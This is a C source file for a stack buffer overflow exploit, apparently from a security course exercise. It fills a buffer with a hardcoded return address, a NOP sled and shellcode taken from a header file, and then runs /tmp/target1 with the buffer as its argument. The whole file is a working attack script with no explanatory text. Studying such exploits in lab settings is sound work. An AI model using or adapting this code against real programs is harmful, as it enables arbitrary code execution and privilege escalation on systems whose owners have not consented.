#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90
#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 290

char large_string[248];

unsigned long get_sp(void) {
	__asm__("movl %esp, %eax");
}



int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];
  char *buff, *ptr;
  long *addr_ptr, addr;
  int i;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  //offset = atoi(argv[1]);
  //bsize = atoi(argv[1]);


  buff = malloc(bsize);
  addr = 0xbffffd04; //get_sp - offset;//((unsigned long)0xbffffd48) - offset; //get_sp - offset;

  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long*) ptr;

  for (i = 0; i < bsize; i+=4) { //Fill the buffer with the target address
  	*(addr_ptr++) = addr;
  }

  for (i = 0; i < bsize/2; i++) { //Fill the first part of the buffer with NOPs
  	buff[i] = NOP;
  }

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++) {
  	*(ptr++) = shellcode[i];
  }
  buff[bsize -1] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
